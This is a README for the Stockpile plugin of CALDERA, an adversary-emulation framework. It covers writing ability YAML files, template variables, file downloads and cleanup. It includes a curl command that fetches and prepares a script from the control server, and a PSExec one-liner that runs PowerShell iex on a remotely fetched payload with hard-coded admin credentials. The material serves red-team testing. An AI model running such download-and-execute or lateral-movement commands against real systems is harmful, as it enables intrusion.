# CALDERA plugin: Stockpile

This plugin contains:

* A collection of abilities
* Pre-built adversary profiles
* A filestore
* A basic planner 

## Abilities

You can quickly add your own abilities and adversaries to the stockpile, both of which are reloaded every time
the core server reboots. Stockpile abilities are located in the abilities/ directory.

To add new ones, add a .yml file in the abilities directory, named after a unique ID (UUID-4 is our standard). 
This file should include an ID, name, description, ATT&CK tactic and command.

Below is an example ability. Read this carefully, it will be referenced later on.
```
- id: e9bcdf0d-be08-4aec-bf1e-e73655403d55
  name: Download WIFI tools
  description: Download a set of commands for manipulating WIFI
  tactic: discovery
  technique:
    attack_id: T1016
    name: System Network Configuration Discovery
  command: |
    curl -sk -X POST -H 'file:wifi.sh' #{server}/file/download > /tmp/wifi.sh &&
    chmod +x /tmp/wifi.sh
  cleanup:
    rm /tmp/wifi.sh
```

### Ability variables

As you write abilities, note that there are two global variables available, server and group, which 
can be used inside an ability command.

A variable is referenced with the syntax #{variable}.

* Server / #{server}: The location of CALDERA. Because each agent may have a different reference point
for where CALDERA is (IP, FQDN, etc), if an ability wants to reference CALDERA it should use #{server}. 
* Group / #{group}: The group used in the active operation.

In the ability example above, note the usage of the #{server} variable.

The group variable is a bit more advanced. This is useful primarily for lateral movement abilities where
the agent may move itself to a new host. A snippet of what this may look like (for PSExec) would be
```
psexec \\127.0.0.1 -u administrator -p password123 Powershell.exe iex (irm -Method Post -Headers @{'file'='54ndc47.ps1'}  #{server}/file/render?group=#{group})
```

### Download files from CALDERA to an agent

In the ability example, note the command downloading the wifi.sh file from CALDERA. It does this by sending a
POST request to the API endpoint /file/download, including the requested filename as a header.

The /file/download endpoint will look inside the filestore directory of every loaded plugin when called.

### Cleanup

Abilities can optionally include a cleanup block, which will execute automatically at the end of an operation. The
cleanup should be used in instances you want to reverse a mutable action, such as stopping a started process. In
the ability example above, note how the cleanup block is written. Cleanup actions will occur in reverse order
of the abilities that ran.

## Adversaries

New adversaries can be added to the adversaries.yml file.

## Planners

A basic planner, called sequential, runs all abilities on an adversary against all hosts in a group
